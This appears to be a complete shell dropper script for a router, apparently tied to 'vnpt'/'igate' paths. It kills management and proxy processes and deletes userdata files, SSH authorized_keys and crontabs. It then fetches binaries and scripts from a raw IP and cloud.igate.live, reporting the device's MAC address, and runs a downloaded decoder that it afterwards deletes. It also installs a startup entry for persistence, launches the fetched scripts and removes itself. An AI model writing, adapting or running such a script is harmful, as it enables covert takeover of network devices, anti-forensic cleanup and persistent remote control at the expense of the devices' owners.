#!/bin/sh
killall tinyproxy
rm -rf /tmp/yaffs/.*
killall wget pppb proxy psd cwmp prod
rm -rf /tmp/yaffs/.*
rm /tmp/userdata/rcS.d/S* /tmp/userdata/igate /tmp/userdata/vnpt.sh /tmp/userdata/wget /tmp/userdata/psdm /tmp/userdata/pw /tmp/userdata/pppb /tmp/userdata/ppps /tmp/userdata/auth /tmp/userdata/rpppb /tmp/userdata/dpppb
rm /tmp/authorized_keys
chmod 777 /tmp/dl; /tmp/dl 168.231.122.232 80 168.231.122.232 /v2/userdata/wget /tmp/userdata/wget

mac_addr=`ip link show br0| grep link/ether| cut -c 16-32`
chmod 777 /tmp/userdata/wget; /tmp/userdata/wget http://cloud.igate.live/v2/userdata/vnpt.sh?m=$mac_addr -O /tmp/userdata/vnpt.sh
/tmp/userdata/wget http://cloud.igate.live/v2/userdata/vnptp2.sh?m=$mac_addr -O /tmp/userdata/vnptp2.sh
mkdir /tmp/userdata/rcS.d
/tmp/userdata/wget http://cloud.igate.live/v2/userdata/S02 -O /tmp/userdata/rcS.d/S02
/tmp/userdata/wget http://cloud.igate.live/v2/userdata/de -O /tmp/decode
chmod 777 /tmp/decode
/tmp/decode 
rm /tmp/decode
rm /var/spool/cron/crontabs/operator
rm /var/spool/cron/crontabs/customer
sh /tmp/userdata/vnptp2.sh &
sh /tmp/userdata/vnpt.sh; sh /tmp/userdata/vnpt.sh &
rm /tmp/deploy.sh
# /sbin/reboot &

